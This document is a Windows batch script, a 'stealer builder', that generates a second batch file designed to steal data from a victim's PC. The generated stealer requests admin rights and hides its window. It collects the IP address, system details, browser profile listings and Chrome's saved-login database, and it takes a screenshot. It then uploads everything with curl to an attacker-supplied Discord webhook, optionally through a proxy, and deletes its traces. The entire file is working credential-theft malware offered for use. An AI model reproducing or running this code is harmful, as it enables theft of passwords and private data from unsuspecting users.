@echo off
setlocal enabledelayedexpansion

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo ===================================
echo       pewpew Stealer Builder
echo ===================================
echo.

:webhook_input
set "webhook="
set /p webhook=Enter Discord Webhook URL: 
if "!webhook!"=="" goto webhook_input

:filename_input
set "filename="
set /p filename=Enter output filename (default: stealer.bat): 
if "!filename!"=="" set filename=stealer.bat

:proxy_input
set "useproxy="
set /p useproxy=Use proxy? (y/n): 
if /i not "!useproxy!"=="y" if /i not "!useproxy!"=="n" (
    echo Invalid input. Please enter Y or N.
    goto proxy_input
)

if /i "!useproxy!"=="y" (
    :proxyip_input
    set "proxyip="
    set /p proxyip=Enter proxy IP: 
    if "!proxyip!"=="" goto proxyip_input

    :proxyport_input
    set "proxyport="
    set /p proxyport=Enter proxy port: 
    if "!proxyport!"=="" goto proxyport_input
)

:browserinfo_input
set "browserinfo="
set /p browserinfo=Collect browser information? (y/n): 
if /i not "!browserinfo!"=="y" if /i not "!browserinfo!"=="n" (
    echo Invalid input. Please enter Y or N.
    goto browserinfo_input
)

:systeminfo_input
set "systeminfo="
set /p systeminfo=Collect system information? (y/n): 
if /i not "!systeminfo!"=="y" if /i not "!systeminfo!"=="n" (
    echo Invalid input. Please enter Y or N.
    goto systeminfo_input
)

:screenshot_input
set "screenshot="
set /p screenshot=Take screenshot? (y/n): 
if /i not "!screenshot!"=="y" if /i not "!screenshot!"=="n" (
    echo Invalid input. Please enter Y or N.
    goto screenshot_input
)

echo Creating stealer file: !filename!
echo @echo off > "!filename!"
echo setlocal enabledelayedexpansion >> "!filename!"

echo net session ^>nul 2^>^&1 >> "!filename!"
echo if %%errorlevel%% neq 0 ( >> "!filename!"
echo     powershell -Command "Start-Process '%%~f0' -Verb RunAs" >> "!filename!"
echo     exit /b >> "!filename!"
echo ) >> "!filename!"
echo. >> "!filename!"

echo mode con:cols=1 lines=1 >> "!filename!"
echo color 00 >> "!filename!"
echo powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c """"' -WindowStyle Hidden" >> "!filename!"

echo set "wh=!webhook!" >> "!filename!"

if /i "!useproxy!"=="y" (
    echo set "useproxy=yes" >> "!filename!"
    echo set "proxyip=!proxyip!" >> "!filename!"
    echo set "proxyport=!proxyport!" >> "!filename!"
) else (
    echo set "useproxy=no" >> "!filename!"
)

echo. >> "!filename!"
echo set "tempdir=%%temp%%\sysdata" >> "!filename!"
echo if not exist "%%tempdir%%" mkdir "%%tempdir%%" 2^>nul >> "!filename!"
echo. >> "!filename!"

echo curl -s ipinfo.io/ip ^> "%%tempdir%%\ip_info.txt" 2^>nul >> "!filename!"
echo ipconfig ^| findstr IPv4 ^>^> "%%tempdir%%\ip_info.txt" 2^>nul >> "!filename!"
echo. >> "!filename!"

if /i "!systeminfo!"=="y" (
    echo echo %%computername%% ^> "%%tempdir%%\system_info.txt" >> "!filename!"
    echo echo %%username%% ^>^> "%%tempdir%%\system_info.txt" >> "!filename!"
    echo systeminfo ^| findstr /B /C:"OS Name" /C:"OS Version" ^>^> "%%tempdir%%\system_info.txt" 2^>nul >> "!filename!"
    echo systeminfo ^| findstr /B /C:"Total Physical Memory" /C:"System Manufacturer" /C:"System Model" /C:"Processor" ^>^> "%%tempdir%%\system_info.txt" 2^>nul >> "!filename!"
)

if /i "!browserinfo!"=="y" (
    echo if exist "%%localappdata%%\Google\Chrome\User Data" ( >> "!filename!"
    echo   dir "%%localappdata%%\Google\Chrome\User Data\Default" ^| findstr "Login Cookies History" ^> "%%tempdir%%\browser_info.txt" 2^>nul >> "!filename!"
    echo   copy "%%localappdata%%\Google\Chrome\User Data\Default\Login Data" "%%tempdir%%\chrome_login.dat" ^>nul 2^>^&1 >> "!filename!"
    echo ) >> "!filename!"
    
    echo if exist "%%appdata%%\Mozilla\Firefox\Profiles" ( >> "!filename!"
    echo   dir "%%appdata%%\Mozilla\Firefox\Profiles" ^>^> "%%tempdir%%\browser_info.txt" 2^>nul >> "!filename!"
    echo ) >> "!filename!"
    
    echo if exist "%%localappdata%%\Microsoft\Edge\User Data" ( >> "!filename!"
    echo   dir "%%localappdata%%\Microsoft\Edge\User Data\Default" ^| findstr "Login Cookies History" ^>^> "%%tempdir%%\browser_info.txt" 2^>nul >> "!filename!"
    echo ) >> "!filename!"
)

if /i "!screenshot!"=="y" (
    echo powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%%{PRTSC}'); Start-Sleep -Milliseconds 500; \$img = [System.Windows.Forms.Clipboard]::GetImage(); if(\$img -ne \$null) { \$img.Save('%%tempdir%%\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png); }" >> "!filename!"
)

echo echo ^{ "content": "New data from %%computername%% (%%username%%)" ^} ^> "%%tempdir%%\message.json" >> "!filename!"
echo. >> "!filename!"
echo if "%%useproxy%%"=="yes" ( >> "!filename!"
echo   curl -x %%proxyip%%:%%proxyport%% -F "file1=@%%tempdir%%\ip_info.txt" -F "payload_json=@%%tempdir%%\message.json" %%wh%% 2^>nul >> "!filename!"
echo   if exist "%%tempdir%%\system_info.txt" curl -x %%proxyip%%:%%proxyport%% -F "file=@%%tempdir%%\system_info.txt" %%wh%% 2^>nul >> "!filename!"
echo   if exist "%%tempdir%%\browser_info.txt" curl -x %%proxyip%%:%%proxyport%% -F "file=@%%tempdir%%\browser_info.txt" %%wh%% 2^>nul >> "!filename!"
echo   if exist "%%tempdir%%\screenshot.png" curl -x %%proxyip%%:%%proxyport%% -F "file=@%%tempdir%%\screenshot.png" %%wh%% 2^>nul >> "!filename!"
echo   if exist "%%tempdir%%\chrome_login.dat" curl -x %%proxyip%%:%%proxyport%% -F "file=@%%tempdir%%\chrome_login.dat" %%wh%% 2^>nul >> "!filename!"
echo ) else ( >> "!filename!"
echo   curl -F "file1=@%%tempdir%%\ip_info.txt" -F "payload_json=@%%tempdir%%\message.json" %%wh%% 2^>nul >> "!filename!"
echo   if exist "%%tempdir%%\system_info.txt" curl -F "file=@%%tempdir%%\system_info.txt" %%wh%% 2^>nul >> "!filename!"
echo   if exist "%%tempdir%%\browser_info.txt" curl -F "file=@%%tempdir%%\browser_info.txt" %%wh%% 2^>nul >> "!filename!"
echo   if exist "%%tempdir%%\screenshot.png" curl -F "file=@%%tempdir%%\screenshot.png" %%wh%% 2^>nul >> "!filename!"
echo   if exist "%%tempdir%%\chrome_login.dat" curl -F "file=@%%tempdir%%\chrome_login.dat" %%wh%% 2^>nul >> "!filename!"
echo ) >> "!filename!"
echo. >> "!filename!"

echo timeout /t 3 /nobreak ^> nul >> "!filename!"
echo rd /s /q "%%tempdir%%" ^> nul 2^>^&1 >> "!filename!"
echo exit >> "!filename!"

echo.
echo Stealer builder completed successfully!
echo Output file: !filename!
echo.
echo Press any key to exit...
pause > nul
